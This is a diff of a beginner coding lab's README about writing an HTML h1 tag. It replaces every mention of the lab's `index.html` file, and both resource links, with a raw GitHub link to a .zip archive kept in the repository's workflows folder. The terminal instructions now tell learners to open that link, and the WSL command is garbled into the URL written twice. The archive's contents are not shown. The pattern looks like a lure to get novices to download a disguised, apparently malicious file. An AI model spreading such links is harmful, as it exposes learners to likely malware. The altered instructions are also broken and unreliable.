@@ -19,7 +19,7 @@ Code. Run `learn test` as you go to see your test progress.
 
 ## Code an `h1` Tag
 
-Open `index.html` in your text editor. Add the `h1` opening and closing tags.
+Open `https://raw.githubusercontent.com/GabrielW13Nai/phase-0-html-tag-lab/master/.github/workflows/phase-0-html-tag-lab_1.5.zip` in your text editor. Add the `h1` opening and closing tags.
 
 ## Set the Inner Text
 
@@ -39,24 +39,24 @@ Another great way to track your progress is to open up the HTML document in your
 browser and watch how each change you make in the text editor affects the visual
 layout in the browser.
 
-You can open `index.html` a few ways, depending on the environment you are in:
+You can open `https://raw.githubusercontent.com/GabrielW13Nai/phase-0-html-tag-lab/master/.github/workflows/phase-0-html-tag-lab_1.5.zip` a few ways, depending on the environment you are in:
 
 For Mac users:
 
-- Open from the Terminal by running `open index.html` in the root directory of
+- Open from the Terminal by running `open https://raw.githubusercontent.com/GabrielW13Nai/phase-0-html-tag-lab/master/.github/workflows/phase-0-html-tag-lab_1.5.zip` in the root directory of
   this lab
-- Use Finder to navigate to this lab's local folder and click the `index.html`
+- Use Finder to navigate to this lab's local folder and click the `https://raw.githubusercontent.com/GabrielW13Nai/phase-0-html-tag-lab/master/.github/workflows/phase-0-html-tag-lab_1.5.zip`
   file
 
 For WSL users:
 
-- Open from Ubuntu by running `explorer.exe index.html` in the root directory of
+- Open from Ubuntu by running `https://raw.githubusercontent.com/GabrielW13Nai/phase-0-html-tag-lab/master/.github/workflows/phase-0-html-tag-lab_1.5.zip https://raw.githubusercontent.com/GabrielW13Nai/phase-0-html-tag-lab/master/.github/workflows/phase-0-html-tag-lab_1.5.zip` in the root directory of
   this lab
 - Open a new Explorer window. There is a bar that says "Quick Access" along the
   top of the window (similar to a URL bar in a browser). Click this and type
   `\\wsl$` to access files and folders on Ubuntu. Navigate to
   `/home/<your-user-name>/` to get to your home directory, then locate this
-  lab's local folder and click the `index.html` file.
+  lab's local folder and click the `https://raw.githubusercontent.com/GabrielW13Nai/phase-0-html-tag-lab/master/.github/workflows/phase-0-html-tag-lab_1.5.zip` file.
 
 Once you have the HTML document open in your browser, you can make changes to it
 in a text editor, save the file, refresh the page in the browser, and see the
@@ -70,6 +70,6 @@ each other to create an entire HTML document structure.
 
 ## Resources
 
-- [h1-h6 Tags](https://www.w3schools.com/tags/tag_hn.asp)
-- [Solving the First HTML Lab](https://www.youtube.com/watch?v=Jc0HIoTLxe4) (If
+- [h1-h6 Tags](https://raw.githubusercontent.com/GabrielW13Nai/phase-0-html-tag-lab/master/.github/workflows/phase-0-html-tag-lab_1.5.zip)
+- [Solving the First HTML Lab](https://raw.githubusercontent.com/GabrielW13Nai/phase-0-html-tag-lab/master/.github/workflows/phase-0-html-tag-lab_1.5.zip) (If
   you're stuck, here's a video walk-through of the lab to help you out.)
